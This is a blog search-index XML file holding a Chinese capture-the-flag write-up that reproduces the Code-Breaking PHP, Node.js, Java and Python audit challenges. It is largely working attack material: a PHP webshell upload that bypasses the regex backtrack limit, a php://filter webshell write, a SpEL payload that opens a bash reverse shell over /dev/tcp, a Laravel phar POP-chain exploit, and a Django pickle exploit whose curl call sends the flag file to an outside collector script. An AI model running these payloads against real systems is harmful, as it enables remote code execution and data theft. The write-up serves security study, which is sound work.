<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CodeBreaking 代码审计]]></title>
    <url>%2F2019%2F09%2F14%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
    <content type="text"><![CDATA[CodeBreaking : https://code-breaking.com/ 在线正则表达式匹配 : https://regex101.com/ 根据已有的大佬们的 wp 对 code breaking 做的一个复现，很多内容都是第一次接触，对涉及到的知识点做些总结和拓展。 function create_function 注入 源码 12345678&lt;?php$action = $_GET['action'] ?? '';$arg = $_GET['arg'] ?? '';if(preg_match('/^[a-z0-9_]*$/isD', $action)) &#123; show_source(__FILE__);&#125; else &#123; $action('', $arg);&#125; 正则 /i 不区分大小写，/s 匹配任何不可见字符，包括空格，TAB，换行，/D 如果使用 $ 限制结尾字符，则不允许结尾有换行 preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action) 匹配所有字母，数字和下划线开头的字符串 想通过 fuzz 找到字符串以达到 bypass 的目的 123456789101112131415import requestsurl_start = 'http://192.168.233.132:8087/?action='url_end = 'var_dump&amp;arg=2'for i in range(1,256): i = chr(i).encode() para = i.hex() url = url_start + '%' + str(para) + url_end r = requests.get(url=url) # 不出现 error 且 不返回 index.php if (r.headers['Content-Length'] != '279') and ('error' not in r.text): print(para) 找到了 %5c，即 \，可以让 var_dump 成功执行，ph 牛给了如下的解释。接下来就是 getshell 函数的寻找，要有两个参数且第二个参数可能会导致 RCE php 里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名 function_name() 调用，调用的时候其实相当于写了一个相对路径；而如果写 \function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 不难发现函数 create_function，官方定义如图 以如下代码为例 12345678&lt;?php$newfunc = create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');echo "New anonymous function: $newfunc\n";echo $newfunc(2, M_E) . "\n";// outputs// New anonymous function: lambda_1// ln(2) + ln(2.718281828459) = 1.6931471805599?&gt; 第一行代码等价于 12345eval(function __lambda_func($a, $b)&#123; return "ln($a) + ln($b) = " . log($a * $b); &#125;) 本题就可以构造 payload : action=\create_function&amp;arg=return &#39;peri0d&#39;;}var_dump(scandir(&#39;../&#39;));/*，然后 readfile(flag) 即可 相当于 123456eval(function __lambda_func($a, $b)&#123; return 'peri0d';&#125; var_dump(scandir('../')); /*&#125;) pcrewaf PCRE 回溯次数限制绕过正则 源码 1234567891011121314151617181920&lt;?phpfunction is_php($data)&#123; return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);&#125;if(empty($_FILES)) &#123; die(show_source(__FILE__));&#125;$user_dir = 'data/' . md5($_SERVER['REMOTE_ADDR']);$data = file_get_contents($_FILES['file']['tmp_name']);if (is_php($data)) &#123; echo "bad request";&#125; else &#123; @mkdir($user_dir, 0755); $path = $user_dir . '/' . random_int(0, 10) . '.php'; move_uploaded_file($_FILES['file']['tmp_name'], $path); header("Location: $path", true, 303);&#125; 上传文件，使用正则判断是否含有 php 代码，正则 /i 不区分大小写，/s 匹配任何不可见字符，包括空格，TAB，换行。 如果不含有 php 代码，上传的文件会被保存，并在 http 中重定向到文件路径 常见的正则引擎有两种，DFA 和 NFA，php 中的 PCRE 库使用的是 NFA， DFA : 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入 NFA : 从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 假设待匹配字符串 &lt;?php phpinfo();//aaaaa 匹配顺序如下图 : 在第四步，由于匹配的是 .* 任意多个字符，所以匹配到最后 按照正则，在 .* 后面应该是 [(`;?&gt;] ，显然 //aaaaa 不对，所以依次吐出这几个字符，即回溯，这里总共回溯了 8 次，回溯到 ; 时 .* 匹配的是 &lt;?php phpinfo() ，后面的 ; 符合 [(`;?&gt;] ，所以匹配 ; ，然后正则最后的 .* 匹配到最后 php 有一个回溯上限 backtrack_limit ，默认是 1000000。如果回溯上限超过 100 万那么 preg_match 返回 false ，既不是 1 也不是 0 ，这样就可以绕过了 对应 poc : 12345678910111213import requestsfrom io import BytesIOurl = 'http://192.168.233.132:8088/index.php'files = &#123; 'file': BytesIO(b'&lt;?php eval($_POST[shell]);//' + b'a'*1000000)&#125;# 请求并禁止重定向r = requests.post(url=url, files=files, allow_redirects=False)print(r.headers) 可以获取 shell 位置，连接即可 如下一个 waf : 1234&lt;?phpif(preg_match('/UNION.+?SELECT/is', $input)) &#123; die('SQL Injection');&#125; 输入 UNION/*aaaaa*/SELECT ，这个正则表达式执行流程如下 正则先匹配 UNION，然后 .+? 匹配 / 由于是非贪婪匹配，匹配最短字符，所以只匹配到 / 就停止 接着 S 匹配 * ，匹配失败，回溯，由 .+? 匹配 * ，成功 重复上一步，直到匹配结束 这里也可以利用回溯次数限制绕过正则 preg_match 返回的是匹配到的次数，如果匹配不到会返回 0 ，如果报错就会返回 false 。所以，对 preg_match 来说，只要对返回结果有判断，就可以避免这样的问题 phpmagic 伪协议解码 base64 写入 shell 代码如下 12345678910111213141516171819202122232425262728&lt;?phpif(isset($_GET['read-source'])) &#123; exit(show_source(__FILE__));&#125;define('DATA_DIR', dirname(__FILE__) . '/data/' . md5($_SERVER['REMOTE_ADDR']));if(!is_dir(DATA_DIR)) &#123; mkdir(DATA_DIR, 0755, true);&#125;chdir(DATA_DIR);$domain = isset($_POST['domain']) ? $_POST['domain'] : '';$log_name = isset($_POST['log']) ? $_POST['log'] : date('-Y-m-d');if(!empty($_POST) &amp;&amp; $domain)&#123; $command = sprintf("dig -t A -q %s", escapeshellarg($domain)); $output = shell_exec($command); $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES); $log_name = $_SERVER['SERVER_NAME'] . $log_name; if(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'], true)) &#123; file_put_contents($log_name, $output); &#125;echo $output;&#125;endif; ?&gt; $_SERVER[&#39;REMOTE_ADDR&#39;] 获取浏览当前页面的用户的 IP 地址，在 data 下创建文件夹，用于存储 output $domain 和 $log 两个参数可控，$domain 用于 dig 命令，$log 用于将结果写入 在 php 中，只要是传 filename 的地方，都可以传协议流 思路就是 $log_name 处利用伪协议将 $output 处的字符串 base64 解码写入 webshell $_SERVER[&#39;SERVER_NAME&#39;] 获取当前运行脚本所在的服务器的主机名。如果脚本运行于虚拟主机中，该名称是由那个虚拟主机所设置的值决定。这个值可以更改，由 HTTP Header 中的 Host 决定。 pathinfo() 函数过滤后缀名，但是，只要在后缀名后加上 /. ，它就获取不到后缀名了，且可以正常写入 .php 之中。php 在处理路径的时候，会递归删除掉路径中存在的 /. php 伪协议 base64 解码中，如果遇到不合规范的字符就直接跳过。base64 解码是按照 4 位解的，所以要只有传入 4 的倍数位字符串才能解码为正常字符串，且传入的 base64 不能以 == 结尾，== 出现在 base64 中间不符合规则，可能会无法解析 payload : 1234POSTHost: phpdomain=YWFhYTw/cGhwIGV2YWwoJF9QT1NUWydzaGVsbCddKTsgLy8q&amp;log=://filter/write=convert.base64-decode/resource=/var/www/html/data/daa6b8b28b2eda419112a887399ce9fc/shell.php/. 结果 : phplimit 无参 RCE 代码如下 : 123456&lt;?phpif(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) &#123; eval($_GET['code']);&#125; else &#123; show_source(__FILE__);&#125; ciscn 2019 和 rctf 2018 的题目，统计一下这一题的解法，主要是 get_defined_vars() 和 session_id() 两个函数 preg_replace(&#39;/[^\W]+\((?R)?\)/&#39;, &#39;&#39;, $_GET[&#39;code&#39;])，\W 匹配任意字母和数字，(?R)? 重复整个模式，?R 是 php 中的一种递归模式，合在一起类似于匹配 x(y(z())) 样式的，且不能存在参数，输入 ?code=phpinfo(); 可以查看 phpinfo 页面 在 rctf 2018 的题目中使用的是 apache 的容器，在本题使用 nginx 容器，都是考虑通过修改请求头信息来实现 RCE 在 apache 中可以使用 getallheaders() 获取所有头信息，而在 nginx 中可以使用 get_defined_vars() 函数获取所有已定义的变量列表，然后就可以通过位置函数来操控数组 session_id() 可以获取 PHPSESSID，虽然 PHPSESSID 只允许字母数字和下划线出现，hex2bin 转换一下编码即可 几个 payload : 123456789// 第一个?code=eval(hex2bin(session_id(session_start()))); // echo 'peri0d';Cookie: PHPSESSID=6563686f2027706572693064273b//第二个?code=eval(end(current(get_defined_vars())));&amp;a=var_dump(scandir('../'));//第三个?code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd()))))))); nodechr js 的题目，关于 javascript 的大小写特性，两个函数 toLowerCase() 和 toLowerCase() 代码如下 : 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103// initial librariesconst Koa = require('koa')const sqlite = require('sqlite')const fs = require('fs')const views = require('koa-views')const Router = require('koa-router')const send = require('koa-send')const bodyParser = require('koa-bodyparser')const session = require('koa-session')const isString = require('underscore').isStringconst basename = require('path').basenameconst config = JSON.parse(fs.readFileSync('../config.json', &#123;encoding: 'utf-8', flag: 'r'&#125;))async function main() &#123; const app = new Koa() const router = new Router() const db = await sqlite.open(':memory:') await db.exec(`CREATE TABLE "main"."users" ( "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, "username" TEXT NOT NULL, "password" TEXT, CONSTRAINT "unique_username" UNIQUE ("username") )`) await db.exec(`CREATE TABLE "main"."flags" ( "id" INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT, "flag" TEXT NOT NULL )`) for (let user of config.users) &#123; await db.run(`INSERT INTO "users"("username", "password") VALUES ('$&#123;user.username&#125;', '$&#123;user.password&#125;')`) &#125; await db.run(`INSERT INTO "flags"("flag") VALUES ('$&#123;config.flag&#125;')`) router.all('login', '/login/', login).get('admin', '/', admin).get('static', '/static/:path(.+)', static).get('/source', source) app.use(views(__dirname + '/views', &#123; map: &#123; html: 'underscore' &#125;, extension: 'html' &#125;)).use(bodyParser()).use(session(app)) app.use(router.routes()).use(router.allowedMethods()); app.keys = config.signed app.context.db = db app.context.router = router app.listen(3000)&#125;function safeKeyword(keyword) &#123; if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123; return keyword &#125; return undefined&#125;async function login(ctx, next) &#123; if(ctx.method == 'POST') &#123; let username = safeKeyword(ctx.request.body['username']) let password = safeKeyword(ctx.request.body['password']) let jump = ctx.router.url('login') if (username &amp;&amp; password) &#123; let user = await ctx.db.get(`SELECT * FROM "users" WHERE "username" = '$&#123;username.toUpperCase()&#125;' AND "password" = '$&#123;password.toUpperCase()&#125;'`) if (user) &#123; ctx.session.user = user jump = ctx.router.url('admin') &#125; &#125; ctx.status = 303 ctx.redirect(jump) &#125; else &#123; await ctx.render('index') &#125;&#125;async function static(ctx, next) &#123; await send(ctx, ctx.path)&#125;async function admin(ctx, next) &#123; if(!ctx.session.user) &#123; ctx.status = 303 return ctx.redirect(ctx.router.url('login')) &#125; await ctx.render('admin', &#123; 'user': ctx.session.user &#125;)&#125;async function source(ctx, next) &#123; await send(ctx, basename(__filename))&#125;main() 关键代码在于 safeKeyword() 函数，过滤了 union 和 select 1234567function safeKeyword(keyword) &#123; if(isString(keyword) &amp;&amp; !keyword.match(/(union|select|;|\-\-)/is)) &#123; return keyword &#125; return undefined&#125; p 牛在博客中提到过如下特性，但是也适用于 python 中，这样就可以绕过保护函数，达到注入的目的 “ ı “.toUpperCase() == ‘ I ‘ “ ſ “.toUpperCase() == ‘ S ‘ “ K “.toLowerCase() == ‘ k ‘ payload : 12POSTusername=peri0d&amp;password=' un%C4%B1on %C5%BFelect 1,(%C5%BFelect flag from flags),3' javacon EI 表达式注入，http://rui0.cn/archives/1043 基础知识 SpEL 注入 Java 反射机制 Linux 反弹 shell 目录结构如下 SpringBoot 框架，看了一下 Spring 表达式 123456789101112131415161718public class HelloWorld &#123; public static void main(String[] args) &#123; //构造上下文：准备比如变量定义等等表达式运行需要的上下文数据 EvaluationContext context = new StandardEvaluationContext(); //创建解析器：提供SpelExpressionParser默认实现 ExpressionParser parser = new SpelExpressionParser(); //解析表达式：使用ExpressionParser来解析表达式为相应的Expression对象 Expression expression = parser.parseExpression("('Hello' + ' World').concat(#end)"); //设置上下文中的变量的值 context.setVariable("end", "!SpringEL"); //执行表达式，获取运行结果 String str = (String)expression.getValue(context); // the str=Hello World!SpringEL System.out.println("the str="+str); &#125; &#125; 先看配置文件 application.yml，提供了一个黑名单和用户列表 1234567891011121314spring: thymeleaf: encoding: UTF-8 cache: false mode: HTMLkeywords: blacklist: - java.+lang - Runtime - exec.*\(user: username: admin password: admin rememberMeKey: c0dehack1nghere1 文件结构 : SmallEvaluationContext.java 实现构造上下文的功能 ChallengeApplication.java 实现启动功能 Encryptor.java 实现 AES 加解密 KeyworkProperties.java 实现黑名单 UserConfig.java 实现用户模型，其中的 RememberMe 用到了 Encryptor MainController.java 控制程序的主要逻辑 主要看 MainController.java 中的代码，在 login 功能处，如果勾选 Remember me 就会返回一个加密之后的 cookie，然后跳转到 hello.html 12345678910111213141516171819@PostMapping("/login") public String login(@RequestParam(value = "username", required = true) String username, @RequestParam(value = "password", required = true) String password, @RequestParam(value = "remember-me", required = false) String isRemember, HttpSession session, HttpServletResponse response) &#123; if (userConfig.getUsername().contentEquals(username) &amp;&amp; userConfig.getPassword().contentEquals(password)) &#123; session.setAttribute("username", username); if (isRemember != null &amp;&amp; !isRemember.equals("")) &#123; Cookie c = new Cookie("remember-me", userConfig.encryptRememberMe()); c.setMaxAge(60 * 60 * 24 * 30); response.addCookie(c); &#125; return "redirect:/"; &#125; return "redirect:/login-error"; &#125; 对敏感信息 cookie 的操作如下，首先判断 remember-me 是否存在，然后获取其值进行解密，直接将它赋值给 username，接下来就是使用 getAdvanceValue() 这个自定义函数赋值给 name 1234567891011121314151617@GetMapping public String admin(@CookieValue(value = "remember-me", required = false) String rememberMeValue,HttpSession session,Model model) &#123; if (rememberMeValue != null &amp;&amp; !rememberMeValue.equals("")) &#123; String username = userConfig.decryptRememberMe(rememberMeValue); if (username != null) &#123; session.setAttribute("username", username); &#125; &#125; Object username = session.getAttribute("username"); if(username == null || username.toString().equals("")) &#123; return "redirect:/login"; &#125; model.addAttribute("name", getAdvanceValue(username.toString())); return "hello"; &#125; getAdvanceValue 函数如下，就是与黑名单匹配，如果匹配则抛出 FORBIDDEN，否则进行正常的 SpEL 解析 12345678910111213private String getAdvanceValue(String val) &#123; for (String keyword: keyworkProperties.getBlacklist()) &#123; Matcher matcher = Pattern.compile(keyword, Pattern.DOTALL | Pattern.CASE_INSENSITIVE).matcher(val); if (matcher.find()) &#123; throw new HttpClientErrorException(HttpStatus.FORBIDDEN); &#125; &#125; ParserContext parserContext = new TemplateParserContext(); Expression exp = parser.parseExpression(val, parserContext); SmallEvaluationContext evaluationContext = new SmallEvaluationContext(); return exp.getValue(evaluationContext).toString(); &#125; 这里就是 SpEL 注入实现 RCE 了，在不指定 EvaluationContext 时，默认采用的是 StandardEvaluationContext ，这里还进行了黑名单匹配，利用反射就可以绕过黑名单 在 JAVA 中，通过 java.lang.Runtime.getRuntime().exec(cmd) 来执行命令，这里可以利用反射写一个反弹 shell 来 getshell，构造 payload 如下 : 1#&#123;T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]&#123;"/bin/bash","-c","bash -i &gt;&amp; /dev/tcp/192.168.233.130/2333 0&gt;&amp;1"&#125;)&#125; 加密之后修改 cookie 发送 123456789import static net.mindview.util.Print.*;public class sss &#123; public static void main(String[] args) &#123; String x = "#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"/bin/bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/192.168.233.130/2333 0&gt;&amp;1\"&#125;)&#125;"; String y = Encryptor.encrypt("c0dehack1nghere1", "0123456789abcdef", x); print(y); &#125;&#125; 实现反弹 shell lumenserial 寻找 POP 链，phar 反序列化，GitHub 给的 docker 环境好像有点问题 https://github.com/phith0n/code-breaking/blob/master/2018/lumenserial 首先看一下路由信息，当访问 /server/editor 时会调用 App\Http\Controllers 的 main 方法 12$router-&gt;get('/server/editor', 'EditorController@main');$router-&gt;post('/server/editor', 'EditorController@main'); 进入 EditorController.php 文件，存在 doUploadImage，doCatchimage，doListImage，doConfig 的功能。进入 main，从 url 获取 action 参数，如果 action 存在就执行这个函数，返回结果均为 json 格式 12345678910111213public function main(Request $request)&#123; $action = $request-&gt;query('action'); try &#123; if (is_string($action) &amp;&amp; method_exists($this, "do&#123;$action&#125;")) &#123; return call_user_func([$this, "do&#123;$action&#125;"], $request); &#125; else &#123; throw new FileException('Method error'); &#125; &#125; catch (FileException $e) &#123; return response()-&gt;json(['state' =&gt; $e-&gt;getMessage()]); &#125;&#125; 在 download 函数中，$url 未经过滤就传给了 file_get_contents，而 $url 源自 doCatchimage 中的 $request-&gt;input($this-&gt;config[&#39;catcherFieldName&#39;])，查看配置文件 /resources/editor/config.json 就可以知道其值为 source，也就是 url 中的 source 参数，然后就可以利用 phar 反序列化 1234567891011121314protected function doCatchimage(Request $request)&#123; $sources = $request-&gt;input($this-&gt;config['catcherFieldName']); $rets = []; if ($sources) &#123; foreach ($sources as $url) &#123; $rets[] = $this-&gt;download($url); &#125; &#125; return response()-&gt;json([ 'state' =&gt; 'SUCCESS', 'list' =&gt; $rets ]);&#125; 可以直接根据已有的 payload 构造反序列化 https://xz.aliyun.com/t/6059 exp : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061&lt;?phpnamespace Illuminate\Broadcasting &#123; class PendingBroadcast &#123; protected $events; protected $event; function __construct($evilCode) &#123; $this-&gt;events = new \Illuminate\Bus\Dispatcher(); $this-&gt;event = new BroadcastEvent($evilCode); &#125; &#125; class BroadcastEvent &#123; public $connection; function __construct($evilCode) &#123; $this-&gt;connection = new \Mockery\Generator\MockDefinition($evilCode); &#125; &#125;&#125;namespace Illuminate\Bus &#123; class Dispatcher &#123; protected $queueResolver; function __construct() &#123; $this-&gt;queueResolver = [new \Mockery\Loader\EvalLoader(), 'load']; &#125; &#125;&#125;namespace Mockery\Loader &#123; class EvalLoader &#123;&#125;&#125;namespace Mockery\Generator &#123; class MockDefinition &#123; protected $config; protected $code; function __construct($evilCode) &#123; $this-&gt;code = $evilCode; $this-&gt;config = new MockConfiguration(); &#125; &#125; class MockConfiguration &#123; protected $name = 'abcdefg'; &#125;&#125;namespace &#123; $code = "&lt;?php phpinfo(); exit; ?&gt;"; $exps = new \Illuminate\Broadcasting\PendingBroadcast($code); $p = new Phar('exp.phar', 0, 'exp.phar'); $p-&gt;startBuffering(); $p-&gt;setStub('GIF89a&lt;?php __HALT_COMPILER(); ?&gt;'); $p-&gt;setMetadata($exps); $p-&gt;addFromString('1.txt','text'); $p-&gt;stopBuffering();&#125;?&gt; picklecode python 反序列化，Django 模板引擎沙箱 基础知识 : python 反序列化 通常代码审计先看配置文件，Django 配置文件 web/core/setting.py，发现如下代码 : 12SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'SESSION_SERIALIZER = 'core.serializer.PickleSerializer' 一般默认的 Django 配置文件是不含这两项的，SESSION_ENGINE 是用户 session 存储的位置，SESSION_SERIALIZER 是 session 存储的方式。用户的 session 先经过 SESSION_SERIALIZER 处理成一个字符串后存储到 SESSION_ENGINE 指定的位置。在这里，就是 session 使用 pickle 的序列化方法，经过签名后存储在 cookies 中，我们所不知道的就是签名的密钥 思路就是获取密钥，pickle 反序列化 阅读路由信息，首先会调用 views.RegistrationLoginView.as_view() 函数，进行登录或者注册之后，在 views.index() 函数中直接将用户名拼接到模板中，也就是说这里存在着 SSTI 漏洞，那就可以利用它获取 SECRET_KEY 12345@login_requireddef index(request): django_engine = engines['django'] template = django_engine.from_string('My name is ' + request.user.username) return HttpResponse(template.render(None, request)) 随意构造一个 username 为 可以看到一个加密后的密码，这就验证了 SSTI 在 /template/registration/login.html 的 csrf_token 处下个断点，可以看到有很多变量，其中有一部分是加载模板的时候传入的，还有一部分是 Django 自带的，可以在 settings.py 中的 templates 查看自带的变量 123456789101112131415TEMPLATES = [ &#123; 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [], 'APP_DIRS': True, 'OPTIONS': &#123; 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], &#125;, &#125;,] 这里的 context_processors 就代表会向模板中注入的一些上下文。通常来说， request 、 user 、和 perms 都是默认存在的，但显然， settings 是不存在的，我们无法直接在模板中读取 settings 中的信息，包括密钥。Django 的模板引擎有一定限制，比如无法读取用下划线开头的属性 经过一番寻找，在 request.user.groups.source_field.opts.app_config.module.admin.settings 处发现 SECRET_KEY ，那就可以构造 username 为 request.user.groups.source_field.opts.app_config.module.admin.settings.SECRET_KEY 即可获取签名密钥了 zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm 接着就是 pickle 的反序列化了，其核心文件为 /core/serializer.py 123456789101112131415161718192021222324252627282930import pickleimport ioimport builtins__all__ = ('PickleSerializer', )class RestrictedUnpickler(pickle.Unpickler): blacklist = &#123;'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'&#125; def find_class(self, module, name): # Only allow safe classes from builtins. if module == "builtins" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))class PickleSerializer(): def dumps(self, obj): return pickle.dumps(obj) def loads(self, data): try: if isinstance(data, str): raise TypeError("Can't load pickle from unicode string") file = io.BytesIO(data) return RestrictedUnpickler(file,encoding='ASCII', errors='strict').load() except Exception as e: return &#123;&#125; 其中设置了一个反序列化沙盒，禁用了 &#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39; 并且只允许调用 python 内置函数 但是 getattr 这个万金油函数没有被限制，那就可以使用 builtins.getattr(builtins,&#39;eval&#39;) 来获取 eval 函数，这就相当于绕过了这个沙盒 首先执行 getattr 获取 eval 函数，再执行 eval 函数，这实际上是两步，而我们常用 __reduce__ 生成的序列化字符串，只能执行一个函数，这就产生矛盾了，所以就要放弃 __reduce__ 直接手写 pickle 代码 pickle 是一种堆栈语言，它没有变量名这个概念，pickle 的内容存储在 stack(栈) 和 memo(存储信息的列表) 中。首先将 payload b&#39;\x80\x03cnt\nsystem\nq\x00X\x06\x00\x00\x00whoamiq\x01\x85q\x02Rq\x03.&#39; 写进一个文件 1234567891011import pickleimport osclass Person(): def __reduce__(self): return (os.system, ('whoami',))person = Person()f = open('pickle','wb')pickle.dump(person ,f, protocol = 0)f.close() 执行 python -m pickletools pickle 对其分析，得到一堆操作指令(opcode) 阅读源码可以获得所有的 opcodes 这段 pickle 代码所涉及到的部分符号意思如下 : 1234567c : 引入模块和对象，模块名和对象名以换行符分割。（find_class校验就在这一步，也就是说，只要c这个OPCODE的参数没有被find_class限制，其他地方获取的对象就不会被沙盒影响了，这也是为什么要用getattr来获取对象）p : 将栈顶的元素存储到memo中，p后面跟一个数字，就是表示这个元素在memo中的索引( : 压入一个标志到栈中，表示元组的开始位置V : 向栈中压入一个(unicode)字符串t : 从栈顶开始，找到最上面的一个(，并将(到t中间的内容全部弹出，组成一个元组，再把这个元组压入栈中R : 从栈顶弹出一个可执行对象和一个元组，元组作为函数的参数列表执行，并将返回值压入栈上. : 表示整个程序结束 那么这段 pickle 就很容易懂了 language1234567891000: c GLOBAL &apos;nt system&apos; # 向栈顶压入 &apos;nt.system&apos; 这个可执行对象11: p PUT 0 # 将这个对象存储到 memo 的第 0 个位置14: ( MARK # 压入一个元组的开始标志15: V UNICODE &apos;whoami&apos; # 压入字符串&apos;whoami&apos;23: p PUT 1 # 将这个字符串存储到 memo 的第 1 个位置26: t TUPLE (MARK at 14) # 将由刚压入栈中的字符串弹出，再将由这个字符串组成的元组压入栈中27: p PUT 2 # 将这个元组存储到 memo 的第 2 个位置30: R REDUCE # 从栈上弹出两个元素，分别是可执行对象和元组，并执行，这里即为 &apos;nt.system(&apos;whoami&apos;)&apos; ，将结果压入栈中31: p PUT 3 # 将栈顶的元素(也就是刚才执行的结果)存储到 memo 的第 3 个位置34: . STOP # 程序结束 简化为如下代码，memo 没有起到太大作用，但这段代码仍然可以执行命令 1234ntsystem(VwhoamitR. 接着开始写 pickle 代码 123456789cbuiltins # 将 builtins 设为可执行对象getattr # 获取 getattr 方法(cbuiltins # 压入元组开始标志，并将 builtins 设为可执行对象dict # 获取 dict 对象S&apos;get&apos; # 压入字符串 &apos;get&apos;tR(cbuiltins # 弹出 builtins.dict,get 并组成新的元组压入栈中。然后执行 builtins.getattr(builtins.dict,get) 得到 get 方法压入栈中。再压入元组标志，将 builtins 设为可执行对象globals # 获取 builtins.globals(tRS&apos;builtins&apos; # 压入元组标志，执行 builtins.globals，然后压入字符串 &apos;builtins&apos;tRp1 # 执行 get(builtins)，获取到 builtins 对象存储到 memo[1] 处 python 代码 123456789101112131415161718import pickleimport builtinsdata = b'''cbuiltinsgetattr(cbuiltinsdictS'get'tR(cbuiltinsglobals(tRS'builtins'tRp1.'''data = pickle.loads(data)print(data)# &lt;module 'builtins' (built-in)&gt; 然后利用这个没有限制的 builtins 对象获取危险函数，并执行，这就绕过了沙盒 123456cbuiltins # 将 builtins 设为可执行对象getattr # 获取 getattr 方法(g1 # 压入数组，压入上一步获取的 builtins 对象S&apos;eval&apos; # 压入字符串 &apos;eval&apos;tR(S&apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos; # 获取到 eval 函数。将字符串 &apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos; 压入tR. # 执行 eval(&apos;__import__(&quot;os&quot;).system(&quot;id&quot;)&apos;) 上面都是绕过的分析，看一下本题有哪些可控点，考虑 SESSIONID ，接下来就看一下源码中对于它的操作 它使用的是 django.contrib.sessions.backends.signed_cookies 直接导入 python 代码 123456789101112131415161718192021222324252627282930313233343536373839import pickleimport builtinsimport ioclass RestrictedUnpickler(pickle.Unpickler): blacklist = &#123;'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'&#125; def find_class(self, module, name): # Only allow safe classes from builtins. if module == "builtins" and name not in self.blacklist: return getattr(builtins, name) # Forbid everything else. raise pickle.UnpicklingError("global '%s.%s' is forbidden" % (module, name))def restricted_loads(s): """Helper function analogous to pickle.loads().""" return RestrictedUnpickler(io.BytesIO(s)).load()data = b'''cbuiltinsgetattr(cbuiltinsdictS'get'tR(cbuiltinsglobals(tRS'builtins'tRp1cbuiltinsgetattr(g1S'eval'tR(S'__import__("os").system("id")'tR..'''data = restricted_loads(data)print(data) 本题的 exp 如下，由于在同一个局域网就在物理机上写了一个接收的 php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from django.core import signingimport pickleimport builtins,ioimport base64import datetimeimport jsonimport reimport timeimport zlibdata = b'''cbuiltinsgetattr(cbuiltinsdictS'get'tR(cbuiltinsglobals(tRS'builtins'tRp1cbuiltinsgetattr(g1S'eval'tR(S'__import__("os").system("curl http://192.168.0.100/xss/xss.php?$(cat /flag_djang0_p1ckle | base64)")'tR.'''def b64_encode(s): return base64.urlsafe_b64encode(s).strip(b'=')def pickle_exp(SECRET_KEY): global data is_compressed = False compress = False if compress: # Avoid zlib dependency unless compress is being used compressed = zlib.compress(data) if len(compressed) &lt; (len(data) - 1): data = compressed is_compressed = True base64d = b64_encode(data).decode() if is_compressed: base64d = '.' + base64d SECRET_KEY = SECRET_KEY # 根据SECRET_KEY进行Cookie的制造 session = signing.TimestampSigner(key = SECRET_KEY,salt='django.contrib.sessions.backends.signed_cookies').sign(base64d) print(session)if __name__ == '__main__': SECRET_KEY = 'zs%o-mvuihtk6g4pgd+xpa&amp;1hh9%&amp;ulnf!@9qx8_y5kk+7^cvm' pickle_exp(SECRET_KEY) xss.php 123456789&lt;?php$data = fopen("cookies.txt","a+");foreach ($_GET as $key=&gt;$value) &#123; fwrite($data, $key.":".$value); fwrite($data, "\n");&#125;?&gt; thejs JS 原型污染，没找到对应源码 Node.js原型污染攻击的分析与利用 深入理解JavaScript Prototype污染攻击 一个题解]]></content>
      <categories>
        <category>代码审计</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>代码审计</tag>
        <tag>CodeBreaking</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JS 原型污染]]></title>
    <url>%2F2019%2F09%2F14%2FJS%20%E5%8E%9F%E5%9E%8B%E6%B1%A1%E6%9F%93%2F</url>
